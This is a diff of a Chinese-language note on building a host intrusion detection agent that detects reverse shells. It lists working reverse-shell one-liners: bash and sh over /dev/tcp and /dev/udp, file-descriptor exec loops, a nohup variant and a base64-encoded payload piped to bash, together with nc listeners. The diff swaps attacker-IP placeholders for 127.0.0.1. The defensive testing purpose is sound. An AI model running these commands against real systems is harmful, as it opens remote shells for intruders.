@@ -12,25 +12,47 @@ Summary: HIDS-Agent开发之检测反弹shell ~
 
 
 ```bash
-bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
+bash -i >& /dev/tcp/127.0.0.1/1234 0>&1  #TCP
+
+Listener:
+nc -nvlp 1234
+
+```
+
+![agent](../images/WechatIMG53.jpeg)
 
 
-0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
+```bash
 
-exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done
+sh -i >& /dev/udp/127.0.0.1/1234 0>&1 #UDP
 
-nohup bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
+Listener:
+nc -u -lvp 1234
+
+```
+
+![agent](../images/WechatIMG54.jpeg)
+
+```bash
+
+
+0<&196;exec 196<>/dev/tcp/127.0.0.1/1234; sh <&196 >&196 2>&196
+![agent](../images/WeChat9c018fc36b0256b4286d528e3e91651a.png)
+
+exec 5<>/dev/tcp/127.0.0.1/1234; while read line 0<&5; do $line 2>&5 >&5; done
+
+![agent](../images/WechatIMG56.jpeg)
+
+
+nohup bash -c 'bash -i >& /dev/tcp/127.0.0.1/1234 0>&1'
 
 
 base64搞一下命令
 
-#B64 encode the shell like: echo "nohup bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
-echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
+echo "nohup bash -c 'bash -i >& /dev/tcp/127.0.0.1/1234 0>&1'" | base64 -w0
+echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYxJwo= | base64 -d | bash 2>/dev/null
 
-sh -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
-
-Listener:
-nc -u -lvp 4242
+![agent](../images/WechatIMG55.jpeg)
 
 ```
 
